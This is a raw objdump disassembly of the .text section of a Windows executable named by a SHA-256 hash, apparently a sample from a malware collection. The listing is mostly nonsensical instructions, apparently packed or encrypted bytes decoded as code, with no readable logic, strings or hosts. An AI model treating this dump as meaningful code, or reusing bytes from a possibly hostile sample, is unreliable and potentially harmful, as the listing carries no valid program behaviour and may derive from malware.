
7a2155ff231d950c75ce40b343f7187f3fefa0b30ef970ed025e6a27e646f7f0.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	lea    edi,[ecx-0x35]
  411003:	sub    eax,0xd6de5e24
  411008:	test   eax,0x9a38b63f
  41100d:	or     eax,0x99129501
  411012:	sbb    DWORD PTR [edi-0x74],esi
  411015:	fwait
  411016:	ins    DWORD PTR es:[edi],dx
  411017:	out    0x81,eax
  411019:	test   eax,0xdbdb417a
  41101e:	dec    esp
  41101f:	stos   DWORD PTR es:[edi],eax
  411020:	xchg   ecx,eax
  411021:	ror    BYTE PTR [edx-0x3f],0x55
  411025:	mov    cl,0x22
  411027:	xor    eax,DWORD PTR [ebx-0x3202a975]
  41102d:	div    cl
  41102f:	lea    ebx,[eax-0x7f9139a8]
  411035:	js     0x41101a
  411037:	mov    BYTE PTR [edi+edi*4],dl
  41103a:	inc    edi
  41103b:	jge    0x41100d
  41103d:	imul   esi,edi,0x14b357eb
  411043:	dec    DWORD PTR [edi-0x1b]
  411046:	and    ebp,DWORD PTR [edi+0x2f]
  411049:	push   0xf1f2de1
  41104e:	push   esp
  41104f:	mov    BYTE PTR [esi],dl
  411051:	sub    esp,0xfd340cc6
  411057:	sub    edi,DWORD PTR [esp+eax*1+0x60]
  41105b:	jle    0x4110d8
  41105d:	sbb    al,0x1b
  41105f:	fdivr  st(4),st
  411061:	gs pop ebp
  411063:	lahf   
  411064:	pslld  mm0,QWORD PTR [ebp-0x6e8d0873]
  41106b:	adc    cl,BYTE PTR [edx+0x8e49aa9]
  411071:	lods   eax,DWORD PTR ds:[esi]
  411072:	pop    ss
  411073:	xchg   BYTE PTR [edx+0x6e],ch
  411076:	daa    
  411077:	inc    edx
  411078:	push   esi
  411079:	push   edi
  41107a:	xchg   BYTE PTR [edx],cl
  41107c:	lahf   
  41107d:	inc    eax
  41107e:	loope  0x4110ad
  411080:	and    al,0x9e
  411082:	mov    eax,ds:0xe4382ed6
  411087:	sub    BYTE PTR ds:0x2541e082,0xcb
  41108e:	retf   
  41108f:	mov    eax,0x8b49ef0f
  411094:	fxch   st(6)
  411096:	pushf  
  411097:	push   0x34cb69bd
  41109c:	fcomi  st,st(3)
  41109e:	inc    edx
  41109f:	mov    al,BYTE PTR [edi+0x5e]
  4110a2:	ret    0x7e4d
  4110a5:	mov    eax,ds:0xf1f9da1c
  4110aa:	mov    esi,0x1dfd0bf5
  4110af:	scas   al,BYTE PTR es:[edi]
  4110b0:	adc    BYTE PTR ds:0xa99190fb,al
  4110b6:	push   ecx
  4110b7:	pop    ecx
  4110b8:	outs   dx,DWORD PTR ds:[esi]
  4110b9:	push   esi
  4110ba:	(bad)  
  4110bb:	xchg   ecx,eax
  4110bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110bd:	js     0x4110d8
  4110bf:	pop    ebp
  4110c0:	add    eax,0xb01f546e
  4110c5:	and    eax,0xcd34a0f5
  4110ca:	and    ebx,DWORD PTR [ebp-0x65]
  4110cd:	mov    ecx,esp
  4110cf:	aas    
  4110d0:	mov    ah,0x43
  4110d2:	out    0x2f,eax
  4110d4:	arpl   si,bp
  4110d6:	dec    eax
  4110d7:	xchg   edi,eax
  4110d8:	cmp    DWORD PTR [edx-0x45],edx
  4110db:	cmp    BYTE PTR [edx],cl
  4110dd:	loop   0x4110a2
  4110df:	pop    ebx
  4110e0:	and    DWORD PTR [ebx+0x5401e7a7],esp
  4110e6:	mov    bl,0x1f
  4110e8:	mov    dh,0x6d
  4110ea:	pop    ebp
  4110eb:	loop   0x4110ca
  4110ed:	inc    ecx
  4110ee:	add    DWORD PTR [edi-0x5e],ecx
  4110f1:	fbld   TBYTE PTR [ebp+0x6cfc0a84]
  4110f7:	jge    0x4110a7
  4110f9:	fs aaa 
  4110fb:	push   edi
  4110fc:	cmc    
  4110fd:	mov    ecx,0xec0660a1
  411102:	pop    eax
  411103:	je     0x4110b8
  411105:	or     al,0x7d
  411107:	(bad)  
  411108:	dec    ebp
  411109:	sbb    dl,bl
  41110b:	sbb    BYTE PTR [ebp-0x55],dh
  41110e:	fs cmp eax,0xade189c3
  411114:	gs scas al,BYTE PTR es:[edi]
  411116:	cmp    BYTE PTR [ecx-0x3d],dl
  411119:	xor    ah,al
  41111b:	adc    DWORD PTR [edx+0xc],eax
  41111e:	fdivr  QWORD PTR [esi+0x5d]
  411121:	xchg   ebx,eax
  411122:	dec    esp
  411123:	mov    ebx,0x7ff5015b
  411128:	xchg   edi,eax
  411129:	enter  0xbd12,0xa
  41112d:	inc    eax
  41112e:	cwde   
  41112f:	(bad)  
  411131:	cmp    DWORD PTR ds:[edx+0x18],ebp
  411135:	push   esi
  411136:	loop   0x4110dc
  411138:	or     al,0xf8
  41113a:	das    
  41113b:	inc    ebx
  41113c:	cmc    
  41113d:	(bad)  
  41113e:	clc    
  41113f:	add    BYTE PTR [eax-0x52],dh
  411142:	jne    0x411194
  411144:	mov    bh,0xb6
  411146:	gs repz sbb esp,ebp
  41114a:	pop    esp
  41114b:	xchg   edi,eax
  41114c:	mov    ds:0x7ec2c744,al
  411151:	push   0xb864c353
  411156:	mov    ebp,0x9c4e427a
  41115b:	cmp    DWORD PTR [edi-0x32],edi
  41115e:	push   esi
  41115f:	call   0x7a362472
  411164:	outs   dx,BYTE PTR ds:[esi]
  411165:	xchg   ebp,eax
  411166:	dec    edx
  411167:	pop    esi
  411168:	mov    esi,0x78ad9346
  41116d:	pop    es
  41116e:	pop    esi
  41116f:	mov    bl,0xba
  411171:	mov    ecx,0x30caf5d0
  411176:	enter  0x9030,0xd1
  41117a:	scas   al,BYTE PTR es:[edi]
  41117b:	int    0x4
  41117d:	xor    esi,DWORD PTR [ebx+0x5f]
  411180:	inc    esp
  411181:	pop    ebp
  411182:	jns    0x411180
  411184:	repnz pop ds
  411186:	(bad)
  41118a:	idiv   BYTE PTR [eax-0x2ee99e28]
  411190:	pop    ebx
  411191:	jle    0x4111ae
  411193:	scas   eax,DWORD PTR es:[edi]
  411194:	push   ds
  411195:	pop    ss
  411196:	mov    dl,0xec
  411198:	sar    DWORD PTR ds:[ecx-0x73677218],1
  41119f:	imul   esp,ebx,0xffffffb9
  4111a2:	(bad)  
  4111a3:	jle    0x411211
  4111a5:	xchg   ebx,eax
  4111a6:	shl    DWORD PTR [ebx],cl
  4111a8:	push   ss
  4111a9:	(bad)  
  4111aa:	jp     0x4111e3
  4111ac:	dec    esp
  4111ad:	stos   BYTE PTR es:[edi],al
  4111ae:	jmp    0x6a9ed094
  4111b3:	mov    ah,0x7b
  4111b5:	mov    bh,0x56
  4111b7:	add    bl,bl
  4111b9:	std    
  4111ba:	outs   dx,DWORD PTR ds:[esi]
  4111bb:	xchg   ebp,eax
  4111bc:	leave  
  4111bd:	rcr    DWORD PTR [eax+eax*4],0xd0
  4111c1:	sbb    al,0x8a
  4111c3:	ret    
  4111c4:	loope  0x41115f
  4111c6:	(bad)  
  4111c8:	add    DWORD PTR [esi+0x57bd61a6],0x76439e8c
  4111d2:	or     BYTE PTR [esi-0x7a37ba76],dl
  4111d8:	cmp    al,0xb4
  4111da:	xor    ebp,DWORD PTR [ebx]
  4111dc:	and    eax,0x5d214aad
  4111e1:	jge    0x411232
  4111e3:	inc    ebx
  4111e4:	leave  
  4111e5:	shl    dl,1
  4111e7:	jp     0x41124c
  4111e9:	add    DWORD PTR [esp+eax*4+0x43],ecx
  4111ed:	jge    0x411234
  4111ef:	xchg   ebx,eax
  4111f0:	add    al,0x2a
  4111f2:	out    0x3a,eax
  4111f4:	add    BYTE PTR [edx],bl
  4111f6:	pop    edx
  4111f7:	in     eax,0x4d
  4111f9:	lods   al,BYTE PTR ds:[esi]
  4111fa:	in     al,0x3a
  4111fc:	jne    0x411212
  4111fe:	xor    ah,ch
  411200:	fidivr WORD PTR [ebx-0x5fb71ef]
  411206:	add    DWORD PTR [ebp+edx*2+0x16],ebx
  41120a:	shl    DWORD PTR [ebp+0x4],0x48
  41120e:	loop   0x41119b
  411210:	add    eax,0xa96f91de
  411215:	cdq    
  411216:	stos   BYTE PTR es:[edi],al
  411217:	data16 aam 0xa9
  41121a:	pop    ecx
  41121b:	bnd jl 0x41128b
  41121e:	add    BYTE PTR [edx],bl
  411220:	and    BYTE PTR [edx+0x2d3ed69e],cl
  411226:	je     0x411247
  411228:	inc    edx
  411229:	jo     0x411255
  41122b:	mov    ds:0x2581e30c,eax
  411230:	xchg   edi,eax
  411231:	mov    ds:0x5a0a3f4b,al
  411236:	aaa    
  411237:	adc    al,0x17
  411239:	jbe    0x41128f
  41123b:	sbb    ah,dh
  41123d:	int3   
  41123e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41123f:	push   ecx
  411240:	dec    ebp
  411241:	xor    DWORD PTR [eax],ebx
  411243:	out    dx,al
  411244:	ins    DWORD PTR es:[edi],dx
  411245:	jb     0x41124a
  411247:	ss inc esi
  411249:	push   edx
  41124a:	rol    DWORD PTR ds:0x2a9637e4,1
  411250:	jge    0x411238
  411252:	and    eax,0x5aa2d4b2
  411257:	loope  0x411248
  411259:	inc    ebp
  41125a:	push   ebp
  41125b:	and    DWORD PTR [ebp+0x81ecd4],edi
  411261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411262:	cmp    dl,al
  411264:	pop    esi
  411265:	rcl    esp,0x7c
  411268:	retf   
  411269:	xor    al,0x22
  41126b:	test   eax,0xdaadcd40
  411270:	lock ror DWORD PTR ds:0x753f7978,cl
  411277:	dec    esp
  411278:	int    0x40
  41127a:	ds push es
  41127c:	cmp    esi,DWORD PTR [esi]
  41127e:	je     0x411270
  411280:	repnz add DWORD PTR [edx-0x2c],esi
  411284:	ret    
  411285:	push   es
  411286:	push   0xe6919b45
  41128b:	pop    ecx
  41128c:	or     BYTE PTR [ecx+0x3d],ch
  41128f:	shl    DWORD PTR [esi+0x76],1
  411292:	jne    0x411250
  411294:	sbb    DWORD PTR [ecx],edi
  411296:	push   es
  411297:	mov    bh,0xc3
  411299:	popf   
  41129a:	and    BYTE PTR [edx-0x29],dl
  41129d:	ret    
  41129e:	mov    dl,dl
  4112a0:	iret   
  4112a1:	jp     0x41128c
  4112a3:	fwait
  4112a4:	dec    edi
  4112a5:	das    
  4112a6:	jne    0x4112b3
  4112a8:	ret    
  4112a9:	test   al,0x77
  4112ab:	xchg   edi,eax
  4112ac:	ja     0x4112a5
  4112ae:	push   cs
  4112af:	jbe    0x41128c
  4112b1:	scas   eax,DWORD PTR es:[edi]
  4112b2:	adc    ebp,DWORD PTR [esi-0x758e7b0d]
  4112b8:	loope  0x411332
  4112ba:	pop    ds
  4112bb:	or     edi,0xe1d48c30
  4112c1:	outs   dx,BYTE PTR ds:[esi]
  4112c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112c3:	lods   eax,DWORD PTR ds:[esi]
  4112c4:	or     bh,ah
  4112c6:	mov    ah,0x57
  4112c8:	daa    
  4112c9:	push   ecx
  4112ca:	jae    0x411287
  4112cc:	or     edx,DWORD PTR [edx-0x5e]
  4112cf:	push   esi
  4112d0:	and    eax,0x6a5524f5
  4112d5:	jne    0x411284
  4112d7:	arpl   WORD PTR [esi+0x3b],bx
  4112da:	(bad)  
  4112dc:	ins    DWORD PTR es:[edi],dx
  4112dd:	and    ecx,edi
  4112df:	pusha  
  4112e0:	popf   
  4112e1:	cwde   
  4112e2:	out    0xe7,al
  4112e4:	cmc    
  4112e5:	mov    DWORD PTR [ebx-0x36],ebp
  4112e8:	rcl    BYTE PTR [edi+eiz*4],0x3
  4112ec:	test   bh,bl
  4112ee:	xchg   edx,eax
  4112ef:	pop    es
  4112f0:	push   cs
  4112f1:	or     DWORD PTR [ebx+0x4abd8ed0],ebx
  4112f7:	mov    cl,0xaf
  4112f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112fa:	bound  edx,QWORD PTR [edx-0x1cfcb344]
  411300:	mov    dl,0x11
  411302:	rcr    BYTE PTR [esp+edx*1],1
  411305:	fiadd  DWORD PTR [ebx]
  411307:	in     al,dx
  411308:	push   cs
  411309:	jo     0x4112f1
  41130b:	call   0xf448:0x5fc56096
  411312:	push   ds
  411313:	push   ss
  411314:	jecxz  0x41138f
  411316:	daa    
  411317:	lods   al,BYTE PTR ds:[esi]
  411318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411319:	ret    0x680a
  41131c:	imul   esi,DWORD PTR [ecx],0x76
  41131f:	mov    bh,0xb7
  411321:	jbe    0x411336
  411323:	call   0xf8a7:0xc98fa920
  41132a:	cmp    al,0xcd
  41132c:	ror    BYTE PTR [ecx+eax*4+0x27],0xe2
  411331:	add    al,0x57
  411333:	inc    BYTE PTR cs:[eax]
  411336:	xchg   edi,eax
  411337:	(bad)  
  411338:	icebp  
  411339:	(bad)  
  41133a:	cmp    BYTE PTR [ecx+0x71ec58f9],bh
  411340:	adc    eax,0xac5b0d62
  411345:	fs jp  0x411389
  411348:	aaa    
  411349:	add    al,0x80
  41134b:	rcr    BYTE PTR [edx-0x72ab5e9d],cl
  411351:	mov    ebx,0xc3431ed4
  411356:	mov    esi,?
  411358:	loopne 0x4112e2
  41135a:	pop    ebx
  41135b:	cmp    ecx,DWORD PTR [esi-0x14]
  41135e:	dec    ebp
  41135f:	mov    eax,0xa966d6aa
  411364:	push   edx
  411365:	pop    ds
  411366:	int    0x66
  411368:	xor    eax,DWORD PTR ds:0x146bd116
  41136e:	mov    ebx,0xa76e922a
  411373:	call   0x4a109336
  411378:	cmp    ebx,DWORD PTR [eax+0x69c09b9e]
  41137e:	inc    eax
  41137f:	and    DWORD PTR [eax],esi
  411381:	mov    esi,0x37a455be
  411386:	jne    0x411311
  411388:	sub    ebp,DWORD PTR [eax-0x22]
  41138b:	jns    0x411322
  41138d:	sysret 
  41138f:	sub    esp,ebx
  411391:	ja     0x411358
  411393:	jnp    0x4113a3
  411395:	add    edx,DWORD PTR [edx+0x3489b218]
  41139b:	fsubr  DWORD PTR [edi+ebp*8-0x4a6fe5d3]
  4113a2:	sbb    al,0x32
  4113a4:	(bad)  
  4113a5:	push   es
  4113a6:	xchg   ebp,eax
  4113a7:	ret    0xa6cb
  4113aa:	adc    al,0xae
  4113ac:	add    ch,BYTE PTR [esi+0x20edd457]
  4113b2:	ins    DWORD PTR es:[edi],dx
  4113b3:	mov    eax,ds:0x5cb30712
  4113b8:	setb   ch
  4113bb:	das    
  4113bc:	pop    DWORD PTR [eax+eax*8+0x6a]
  4113c0:	sbb    BYTE PTR [esi+eax*1-0x4a5601b9],cl
  4113c7:	les    ebx,FWORD PTR [ecx+0x697e9906]
  4113cd:	push   edx
  4113ce:	ins    BYTE PTR es:[edi],dx
  4113cf:	sub    DWORD PTR [edi-0x40],edx
  4113d2:	sub    esp,DWORD PTR [eax]
  4113d4:	mov    al,ds:0xac33159e
  4113d9:	mov    edi,ebx
  4113db:	xchg   ebx,eax
  4113dc:	in     eax,dx
  4113dd:	aas    
  4113de:	stc    
  4113df:	jge    0x411402
  4113e1:	jle    0x41143b
  4113e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113e4:	lahf   
  4113e5:	or     dh,BYTE PTR [edx-0x14]
  4113e8:	jae    0x4113af
  4113ea:	push   ebx
  4113eb:	or     ah,BYTE PTR [ebx-0x7a]
  4113ee:	inc    edi
  4113ef:	bsf    eax,DWORD PTR [ebp-0x513e53d4]
  4113f6:	adc    al,0x96
  4113f8:	js     0x4113e2
  4113fa:	test   BYTE PTR [ebp-0x1f],bl
  4113fd:	fstp   TBYTE PTR [edi+0x6c873005]
  411403:	sbb    eax,0x86286789
  411408:	adc    eax,0xd1463c7c
  41140d:	ins    BYTE PTR es:[edi],dx
  41140e:	jle    0x4113f1
  411410:	mov    al,ds:0x1bec267c
  411415:	xchg   ebp,eax
  411416:	mov    dl,0x40
  411418:	call   0x51e5:0xdb4f5dd0
  41141f:	pop    esp
  411420:	inc    edi
  411421:	push   ecx
  411422:	xor    eax,0xeeb4853e
  411427:	cmp    al,0x52
  411429:	xor    eax,0xd874999d
  41142e:	nop
  41142f:	jns    0x411455
  411431:	and    ebp,DWORD PTR [edx+0x6086407c]
  411437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411438:	test   al,0x7f
  41143a:	sub    eax,0x151f38c8
  41143f:	dec    edi
  411440:	dec    eax
  411441:	clc    
  411442:	inc    edi
  411443:	and    bh,al
  411445:	push   ebx
  411446:	and    ecx,esp
  411448:	fsub   DWORD PTR [eax]
  41144a:	inc    esi
  41144b:	adc    eax,0x42cf3f46
  411450:	sub    al,0x0
  411452:	lea    ecx,[edi]
  411454:	xor    al,0x2a
  411456:	sbb    DWORD PTR [esi-0x68c2ac18],0x512ce2a6
  411460:	jmp    0x4113fb
  411462:	xchg   ebp,eax
  411463:	xor    DWORD PTR [eax],esp
  411465:	lock mov ss,ebp
  411468:	fild   WORD PTR [esi]
  41146a:	or     DWORD PTR [edi],eax
  41146c:	(bad)  
  41146d:	jp     0x411462
  41146f:	and    DWORD PTR [edx-0x78334b1f],edi
  411475:	pop    ecx
  411476:	and    BYTE PTR [esi+0x48],bl
  411479:	add    DWORD PTR [edi-0x50],edx
  41147c:	jno    0x411496
  41147e:	add    edi,DWORD PTR [edi+ecx*2]
  411481:	int    0xb
  411483:	sub    BYTE PTR [esi-0x16bf5cf1],bl
  411489:	jecxz  0x4114e8
  41148b:	cld    
  41148c:	or     al,0x67
  41148e:	add    al,0xe9
  411490:	dec    esi
  411491:	push   esp
  411492:	(bad)  
  411494:	shl    BYTE PTR [edi+0x1eba6685],1
  41149a:	xchg   edi,eax
  41149b:	adc    al,cl
  41149d:	sub    ebp,edx
  41149f:	neg    DWORD PTR [ebp-0x3376c00]
  4114a5:	dec    esi
  4114a6:	in     al,dx
  4114a7:	push   eax
  4114a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114a9:	jmp    0x90a0e176
  4114ae:	out    dx,eax
  4114af:	xor    DWORD PTR [edx+0x4dd7c612],esp
  4114b5:	cmp    eax,0x6a2ccab
  4114ba:	add    ecx,0x6c6b8844
  4114c0:	(bad)  
  4114c1:	mov    ebx,0xe63a274a
  4114c6:	add    BYTE PTR [edx+eiz*8-0x4d47754f],0x1c
  4114ce:	sub    BYTE PTR [eax-0x26a7d2a8],ch
  4114d4:	test   dh,cl
  4114d6:	or     dh,BYTE PTR [ebx-0x1d6a0e15]
  4114dc:	in     eax,0x7b
  4114de:	push   esi
  4114df:	dec    ebp
  4114e0:	test   BYTE PTR [ecx+0x2f],al
  4114e3:	cs lahf 
  4114e5:	ja     0x4114d5
  4114e7:	jae    0x4114e0
  4114e9:	fs popf 
  4114eb:	out    dx,al
  4114ec:	cmp    DWORD PTR [ebp+0x9],0x1
  4114f0:	nop
  4114f1:	pop    edi
  4114f2:	jo     0x411522
  4114f4:	shr    DWORD PTR [ebx],1
  4114f6:	and    al,0xc3
  4114f8:	ins    DWORD PTR es:[edi],dx
  4114f9:	push   ss
  4114fa:	jmp    0x41148c
  4114fc:	jo     0x4114e7
  4114fe:	mov    al,0x44
  411500:	out    dx,eax
  411501:	dec    BYTE PTR [ebx-0x1d]
  411504:	mov    ds:0xab86a495,al
  411509:	jmp    DWORD PTR [ebp-0x18]
  41150c:	and    bl,bh
  41150e:	dec    esi
  41150f:	xchg   DWORD PTR [edi-0x532fb27c],eax
  411515:	ins    BYTE PTR es:[edi],dx
  411516:	ins    BYTE PTR es:[edi],dx
  411517:	pushf  
  411518:	or     eax,0x3dc44829
  41151d:	cs cmc 
  41151f:	aad    0xf4
  411521:	sub    DWORD PTR [ecx+0x277518ba],ebp
  411527:	outs   dx,BYTE PTR ds:[esi]
  411528:	jae    0x411528
  41152a:	out    0xa,al
  41152c:	jo     0x411587
  41152e:	aaa    
  41152f:	mov    esi,0x8b43d110
  411534:	inc    edi
  411535:	sti    
  411536:	mov    ds:0x463958d,eax
  41153b:	cmp    esi,DWORD PTR [edi-0x2faca322]
  411541:	enter  0xd320,0x43
  411545:	or     al,0x4f
  411547:	xor    cl,ch
  411549:	rcr    DWORD PTR [edx+eiz*8],cl
  41154c:	push   es
  41154d:	inc    esp
  41154e:	xlat   BYTE PTR ds:[ebx]
  41154f:	pop    esi
  411550:	mov    esp,0x4aaa33bd
  411555:	call   0x7c9920ef
  41155a:	fisub  DWORD PTR [edi-0x271dd7d4]
  411560:	fs cli 
  411562:	daa    
  411563:	es jo  0x4115d2
  411566:	aam    0x9
  411568:	out    dx,eax
  411569:	mov    ebx,0x3855dfd9
  41156e:	cld    
  41156f:	aas    
  411570:	test   ebp,ebx
  411572:	je     0x4115f3
  411574:	int    0x27
  411576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411577:	or     bl,ah
  411579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41157a:	cs jl  0x4115f9
  41157d:	es dec esp
  41157f:	repnz or edi,DWORD PTR [ebp-0x5b25dbe2]
  411586:	mov    ch,0x72
  411588:	pop    edi
  411589:	push   cs
  41158a:	ficomp DWORD PTR [esi-0x1eef9d93]
  411590:	lods   al,BYTE PTR ds:[esi]
  411591:	mul    BYTE PTR [esi]
  411593:	(bad)  
  411594:	jmp    0x4115f9
  411596:	sahf   
  411597:	cmp    al,0xb0
  411599:	fldenv [ebx-0x80]
  41159c:	je     0x411604
  41159e:	fdivr  DWORD PTR [edx]
  4115a0:	into   
  4115a1:	sbb    DWORD PTR [edx],esp
  4115a3:	test   DWORD PTR [esi+0x437d8a0a],0x53ae8757
  4115ad:	popa   
  4115ae:	cmp    dl,BYTE PTR [edx]
  4115b0:	and    BYTE PTR [esi-0x33eef62c],dl
  4115b6:	mov    ch,0xf6
  4115b8:	jecxz  0x41161e
  4115ba:	cmp    esp,DWORD PTR [esi-0xfc493fa]
  4115c0:	scas   eax,DWORD PTR es:[edi]
  4115c1:	push   ebx
  4115c2:	arpl   WORD PTR [ebx-0x7f],sp
  4115c5:	out    0x53,al
  4115c7:	adc    BYTE PTR [esi],0xf
  4115ca:	cwde   
  4115cb:	call   0xf998:0xe88147dc
  4115d2:	push   ds
  4115d3:	pop    esp
  4115d4:	mov    edi,0xa715e2d0
  4115d9:	dec    esi
  4115da:	sub    eax,0xfc1ff73e
  4115df:	push   0x2b1c4e54
  4115e4:	or     eax,0xf0c9ce8c
  4115e9:	in     eax,0x38
  4115eb:	aaa    
  4115ec:	xchg   edx,eax
  4115ed:	push   ebp
  4115ee:	mov    edx,0x9eb2f162
  4115f3:	xor    eax,0xddb97746
  4115f8:	popf   
  4115f9:	hlt    
  4115fa:	xchg   edx,eax
  4115fb:	sbb    bh,ch
  4115fd:	pop    ds
  4115fe:	(bad)  
  411600:	(bad)  [edx]
  411602:	popa   
  411603:	cwde   
  411604:	mov    esp,0x1ebab13a
  411609:	data16 rcl BYTE PTR [eax-0x3510245d],1
  411610:	pop    ebp
  411611:	jg     0x41168f
  411613:	jnp    0x41161a
  411615:	in     eax,dx
  411616:	push   cs
  411617:	mov    al,0x82
  411619:	add    DWORD PTR [edi],edx
  41161b:	jmp    0x4393:0x746e6f6
  411622:	jmp    0x411686
  411624:	dec    edx
  411625:	icebp  
  411626:	rol    BYTE PTR [ecx-0x44136202],cl
  41162c:	test   al,0xdf
  41162e:	xchg   ecx,eax
  41162f:	inc    edi
  411630:	fsub   QWORD PTR [ecx]
  411632:	mov    ecx,0x758d7c95
  411637:	sub    DWORD PTR [esi+0x49025a8c],esp
  41163d:	xchg   ebx,eax
  41163e:	inc    eax
  41163f:	enter  0xcab1,0x42
  411643:	jne    0x4116ae
  411645:	xor    bh,bh
  411647:	pop    edx
  411648:	mov    ds:0x84bc54d7,eax
  41164d:	scas   eax,DWORD PTR es:[edi]
  41164e:	mov    ch,0xea
  411650:	pop    ds
  411651:	imul   ebp,DWORD PTR [esi-0x48bfb62e],0x91874e81
  41165b:	sbb    eax,0x1039d16c
  411660:	add    bl,bl
  411662:	clc    
  411663:	xor    cl,BYTE PTR [ebx+edi*8-0x3bc0826f]
  41166a:	or     eax,0xdb31953c
  41166f:	cmp    eax,ebx
  411671:	dec    ebx
  411672:	push   esp
  411673:	pop    ebx
  411674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411675:	call   0x78a9:0xc2277db1
  41167c:	adc    dl,dh
  41167e:	out    0x8d,al
  411680:	sub    ah,ah
  411682:	shl    BYTE PTR [esi+edx*8+0x5e],cl
  411686:	xchg   esp,eax
  411687:	rcr    dh,cl
  411689:	lock push ss
  41168b:	mov    esp,0x407d7444
  411690:	and    ah,BYTE PTR [edx-0x77]
  411693:	and    BYTE PTR [ecx-0x79ca7196],bh
  411699:	das    
  41169a:	xor    al,BYTE PTR [ebx-0x27cb6d05]
  4116a0:	lock test al,0x7d
  4116a3:	push   esp
  4116a4:	aam    0x85
  4116a6:	mov    DWORD PTR [ecx],ebp
  4116a8:	stc    
  4116a9:	push   esp
  4116aa:	in     eax,0x60
  4116ac:	xor    eax,0x6eff6d15
  4116b1:	int3   
  4116b2:	mul    DWORD PTR [eax-0x6b6d334c]
  4116b8:	dec    esi
  4116b9:	sbb    DWORD PTR [ebp-0x62],ebp
  4116bc:	xchg   ebx,eax
  4116bd:	js     0x411717
  4116bf:	mul    DWORD PTR [eax]
  4116c1:	pusha  
  4116c2:	xchg   edi,eax
  4116c3:	jo     0x411696
  4116c5:	(bad)
  4116c9:	cs jbe 0x411660
  4116cc:	mov    esp,0xebe4d632
  4116d1:	adc    BYTE PTR [eax-0x5a],al
  4116d4:	or     ah,0xc7
  4116d7:	push   edi
  4116d8:	xchg   ecx,ecx
  4116da:	xchg   ebx,eax
  4116db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116dc:	aad    0x8e
  4116de:	inc    ecx
  4116df:	(bad)  
  4116e1:	jb     0x4116dd
  4116e3:	push   es
  4116e4:	mov    dh,0x33
  4116e6:	(bad)  
  4116e7:	xor    DWORD PTR [ebx+edx*4-0x62],0xffffffa4
  4116ec:	aas    
  4116ed:	xchg   DWORD PTR [ebx+0x13a7c228],esi
  4116f3:	mov    al,ds:0x96b138f1
  4116f8:	aad    0xa2
  4116fa:	retf   0x7277
  4116fd:	push   ecx
  4116fe:	mov    eax,0xbc87b5b1
  411703:	and    eax,0x9845542a
  411708:	inc    eax
  411709:	push   edi
  41170b:	fistp  WORD PTR ds:0x1e07e6cb
  411711:	pop    esi
  411712:	rcl    DWORD PTR [ebx+0x1],1
  411715:	ret    
  411716:	ss sub al,0xa1
  411719:	sub    BYTE PTR [ecx],al
  41171b:	jae    0x411712
  41171d:	hlt    
  41171e:	outs   dx,BYTE PTR ds:[esi]
  41171f:	ds ja  0x41179c
  411722:	sbb    ecx,DWORD PTR [edx]
  411724:	pop    ebp
  411725:	or     BYTE PTR [ecx+0x7a],ah
  411728:	push   ds
  411729:	enter  0xd1b7,0xc8
  41172d:	sbb    bl,BYTE PTR [edi+0x5395270d]
  411733:	out    dx,eax
  411734:	in     eax,dx
  411735:	daa    
  411736:	jmp    DWORD PTR [eax-0x842657b]
  41173c:	stc    
  41173d:	mov    edi,0xf0241c08
  411742:	cmp    ebp,DWORD PTR [edx+edx*1+0x1debe244]
  411749:	sbb    dh,ah
  41174b:	inc    DWORD PTR fs:[esi-0x528434a7]
  411752:	clc    
  411753:	rol    BYTE PTR [edx+0x4165c7a1],0x71
  41175a:	(bad)  
  41175b:	and    eax,0xcceb958c
  411760:	sti    
  411761:	lea    ebx,[edi-0x5e4b7fb6]
  411767:	adc    esp,edx
  411769:	sbb    DWORD PTR [edi],edx
  41176b:	jg     0x411752
  41176d:	jg     0x4117a3
  41176f:	enter  0xa015,0x12
  411773:	xchg   ebx,eax
  411774:	aas    
  411775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411776:	jge    0x4117e5
  411778:	fisttp QWORD PTR [esi]
  41177a:	stos   DWORD PTR es:[edi],eax
  41177b:	mov    bh,0x70
  41177d:	xchg   BYTE PTR [ebx+0x5c],bl
  411780:	pusha  
  411781:	mov    ch,0x73
  411783:	std    
  411784:	(bad)  
  411785:	sti    
  411786:	jb     0x411750
  411788:	rol    DWORD PTR [ebx-0x211b0dd5],1
  41178e:	(bad)  
  41178f:	popa   
  411790:	jmp    0xdde5:0x5fd0d6ac
  411797:	in     eax,0x80
  411799:	frstor [ebx+eax*4-0x38]
  41179d:	es inc eax
  41179f:	and    al,0x8c
  4117a1:	xchg   ch,bh
  4117a3:	xchg   ecx,eax
  4117a4:	cmp    BYTE PTR [edi-0x5b5cc22b],ah
  4117aa:	pop    es
  4117ab:	push   ebx
  4117ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ad:	jmp    0xfdd11e1c
  4117b2:	call   0x3483:0xfafc3030
  4117b9:	iret   
  4117ba:	mov    edx,esp
  4117bc:	sub    dh,BYTE PTR [ebx+0x31041e32]
  4117c2:	fs data16 jmp 0x4117c6
  4117c6:	cmp    bh,dl
  4117c8:	out    dx,al
  4117c9:	fdiv   DWORD PTR [ebx]
  4117cb:	fistp  DWORD PTR [edx-0x55]
  4117ce:	ds xor esi,eax
  4117d1:	out    dx,al
  4117d2:	xor    ch,BYTE PTR [esi-0x14]
  4117d5:	adc    DWORD PTR [eax+0x92ad533],eax
  4117db:	mov    esp,0x733ecc73
  4117e0:	fmul   QWORD PTR [ecx-0x50]
  4117e3:	or     dl,0xc2
  4117e6:	push   ss
  4117e7:	pop    esp
  4117e8:	aas    
  4117e9:	std    
  4117ea:	pop    ebx
  4117eb:	jmp    0x99af:0x812bd66a
  4117f2:	icebp  
  4117f3:	std    
